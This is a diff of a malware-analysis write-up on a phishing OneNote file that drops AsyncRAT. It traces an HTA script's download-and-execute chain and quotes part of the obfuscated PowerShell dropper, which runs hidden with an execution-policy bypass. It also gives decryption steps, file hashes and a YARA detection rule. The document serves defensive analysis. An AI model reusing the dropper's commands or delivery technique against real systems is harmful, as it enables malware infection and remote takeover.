@@ -8,28 +8,30 @@ Security Researchers discovered that Threat actors now using OneNote attachments
 
 > **SHA256:** 15212428deeeabcd5b11a1b8383c654476a3ea1b19b804e4aca606fac285387f
 
-![image](https://user-images.githubusercontent.com/43460691/216254046-9a3aec40-0e7f-4026-938f-19dec546ef5a.png)
-
 - Attackers sending OneNote file as an attachment using email and using simple trick to hide suspicious script. 
 
-- The suspicious VBS macro linked to the "Click to view document" PNG picture is just behind this picture.  Once clicked on view document  VBS macro will execute.
+- The suspicious VBS macro linked to the "Click to view document" PNG picture is just behind this picture.  
+
+- Once User clicked on view document  VBS macro will execute.
 
 ![image](https://user-images.githubusercontent.com/43460691/216254324-951b4861-e580-4d77-901c-fcd8cbf620c5.png)
 
-## Dump OneNote File
+## Dump OneNote File content 
 
 - There is an awesome tool created by Didier Stevens to dump content from the OneNote file. Check the below output. OneNote file containing two PNG and one HTA file.
+
+- Steam number 2 holds the HTA script (starting with "<!").
 
 > ***`REMnux: python3 onedump.py "file name"`***
 
 ![image](https://user-images.githubusercontent.com/43460691/216254734-737826fe-afc8-4f3e-a4e6-6f2808bae465.png)
 
-- Below are the dumped files.
+- Below are the dumped files, Where "Click to view document" image used to trick user and execute script.
 
 ![image](https://user-images.githubusercontent.com/43460691/216254817-9180ca56-1b3f-42eb-8ad1-903b4f1e38c8.png)
 
 
-- If you look into HTA file  we can see first ExecuteCmdAsync invoke WebRequest -Uri and downloading notes to do list.one file and writing on disk as invoice.one which is simple note and not malicious.
+- If you look into below HTA file  we can see first ExecuteCmdAsync invoke WebRequest -Uri and downloading **notes_to_do_list.one** file and writing on disk as invoice.one which is simple note and not malicious.
 
 - The second  ExecuteCmdAsync  downloading sky.bat file and writing on disk in tmp folder as system32.bat and execute.
 
@@ -37,7 +39,7 @@ Security Researchers discovered that Threat actors now using OneNote attachments
 
 ## Strings Check
 
-- HTA file is not obfuscated and we can see file in Strings output as well.
+- HTA file is not obfuscated and we can see HTA file in Strings output as well.
 
 > ***`REMnux: strings "file name"`***
 
@@ -85,15 +87,19 @@ AutoOpen
 remnux@remnux:~/Downloads$ 
 ```
 
-## Second Stage Payload
+## Second Stage Payload 
 
-- System32.bat file is obfuscated, Lot of environment variables are created and concatenated to build commands. If it's difficult to read, it's easy to deobfuscate. Just add a "echo" at the beginning of all lines at the bottom of the file and execute it or you can use Procmon tool to PowerShell executed command.
+- System32.bat file is obfuscated, Lot of environment variables are created and concatenated to build commands. If it's difficult to read, it's easy to deobfuscate. 
+
+- Just add a "echo" at the beginning of all lines at the bottom of the file and execute it or you can use Procmon tool to PowerShell executed command.
 
 ![image](https://user-images.githubusercontent.com/43460691/216255585-757086c3-90c7-40c2-88ed-97b47c3df79d.png)
 
+- Capture the process ecexution using Procmon, If you open the process start operation you can see the deobfuscated command.
+
 ![image](https://user-images.githubusercontent.com/43460691/216255614-c01cdf36-c1db-4a3d-a6a0-74900ae66888.png)
 
-- This script is a dropper. The payload is located in the file and read by PowerShell. It is identified by lines starting with ":: ". 
+- This script is a dropper. You can see base64 encoded payload is located in the file and read by PowerShell. Payload is identified by lines starting with **":: ".** 
 
 ```
 "system32.bat.exe" -noprofile -windowstyle hidden -ep bypass -command $eIfqq = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\admin\AppData\Local\Temp\system32.bat').Split([Environment]::NewLine)
@@ -133,12 +139,37 @@ $PtfdQ.Invoke($null, (, [string[]] ('')))
 
 ## Payload Extraction 
 
--The payload is AES encrypted, you can see AES keys in deobfuscated script. We will use these keys to decrypt payload.
+- The payload is AES encrypted, you can see AES keys in deobfuscated script. We will use these keys to decrypt payload.
 
 ![image](https://user-images.githubusercontent.com/43460691/216255929-d279b878-b913-498a-a7e7-cfdaed87335a.png)
 
 
 ![image](https://user-images.githubusercontent.com/43460691/216255962-7725f621-9a49-4b2e-94eb-8fb784d93142.png)
+
+- The decrypted PE file is an ASyncRAT. Check the below file hash.
+
+> **SHA256:** f8b823dc5519d25ef2599725c25306171a8496069b1ba56cb854323ae98d10d1
+
+## YARA Rule
+
+```
+rule malicious_onenote {
+    meta:
+        description = "Detects malicious onenote files"
+
+    strings:
+        $hta = "hta:application" nocase
+        $hta_script = "type=\"text/vbscript\""
+        $hta_open = "autoopen" nocase
+
+    condition:
+        uint32be(0x0) == 0xE4525C7B
+        and 2 of them
+}
+```
+- You can find detailed Yara rule on YARAify website.
+
+  https://yaraify.abuse.ch/yarahub/rule/MALWARE_OneNote_Delivery_Jan23/
 
 
 ## References :
